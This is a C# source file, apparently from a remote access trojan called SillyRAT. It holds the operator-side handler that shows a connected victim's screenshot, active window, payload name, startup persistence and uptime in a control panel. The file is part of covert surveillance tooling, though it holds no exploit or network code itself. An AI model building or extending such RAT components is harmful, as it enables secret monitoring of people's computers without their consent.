using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using SillyRAT;
using Server.Connection;
using Stuff;

namespace Server.Handlers
{
    internal class HandlePreview
    {
        public HandlePreview(SillyClient SillyClient, Unpack unpack)
        {
            string Payload = unpack.GetAsString("Payload");
            string Startup = unpack.GetAsBoolen("Startup").ToString();
            string Uptime = unpack.GetAsString("Uptime");
            string Ping = unpack.GetAsString("Ping");
            string activeWindow = unpack.GetAsString("Window");
            byte[] image = unpack.GetAsByteArray("Image");

            if (Program.form2.InvokeRequired)
            {
                Program.form2.Invoke(new Action(() =>
                {
                    if (Program.form2.listView2.SelectedItems.Count < 1) return;
                    Program.form2.listView3.Items.Clear();
                    using (MemoryStream ms = new MemoryStream(image))
                    {
                        Image img = Image.FromStream(ms);

                        Program.form2.pictureBox5.BackgroundImage = img;
                        Program.form2.pictureBox5.BackgroundImageLayout = ImageLayout.Stretch;
                    }

                    add("Active window", activeWindow, 0);
                    add("Current payload", Payload, 1);
                    add("Startup", Startup, 2);
                    add("Uptime", Uptime, 3);
                    add("Ping", Ping, 4);
                    Program.form2.listView3.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
                }));
            }
            else
            {
                Program.form2.listView3.Items.Clear();
                using (MemoryStream ms = new MemoryStream(image))
                {
                    Image img = Image.FromStream(ms);

                    Program.form2.pictureBox5.BackgroundImage = img;
                    Program.form2.pictureBox5.BackgroundImageLayout = ImageLayout.Stretch;
                }

                add("Active window", activeWindow, 0);
                add("Current payload", Payload, 1);
                add("Startup", Startup, 2);
                add("Uptime", Uptime, 3);
                add("Ping", Ping, 4);
                Program.form2.listView3.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
            }
        }

        private void add(string option, string info, int image)
        {
            ListViewItem item = new ListViewItem(option);

            item.ImageIndex = image;

            item.SubItems.Add(info);

            Program.form2.listView3.Items.Add(item);
        }

    }
}
